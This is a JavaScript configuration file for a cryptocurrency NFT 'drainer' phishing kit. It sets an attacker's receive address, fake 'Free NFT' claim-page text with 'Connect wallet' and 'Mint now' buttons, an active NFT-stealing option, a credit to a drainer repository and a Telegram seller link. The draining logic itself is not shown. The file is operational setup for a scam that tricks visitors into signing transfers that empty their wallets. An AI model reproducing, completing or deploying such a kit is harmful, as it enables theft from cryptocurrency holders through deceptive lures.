const receiveAddress = "Y0x7d8Ac1a2806f8670fB0c643Dc732488d3cDC6dC4";

const collectionInfo = {
    name: "NFA",
    socialMedia: {
        discord: "https://t.me/TecOnSellix",
        twitter: "https://t.me/TecOnSellix",
        instagram: "https://t.me/TecOnSellix",
    },
}

const indexPageInfo = {
    backgroundImage: "background.jpg", // relative path to background image (in assets)
    title: "NFA", // {name} will be replaced with collectionInfo.name
    underTitle: "Free NFT for all",
}

const claimPageInfo = {
    title: "FREE NFT", // Name will appeair
    shortDescription: "NFT offer for all",
    longDescription: "YOU CAN CLAIM YOUR NFT NOW TO BECOME NFT MEMBER !",

    claimButtonText: "CLAIM NOW",

    image: "TecOnSellix.jpeg", // relative path to image (in assets)
    imageRadius: 250, // image radius in px
}

const drainNftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    nftReceiveAddress: "" // leave empty if you want to use the same as receiveAddress 
}

const customStrings = {
    title: "MINT NFA", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "Connect wallet",
    transferButton: "Mint now",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = https://github.com/0x32Moon/Crypto-Nft-Drainer-V2 = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion
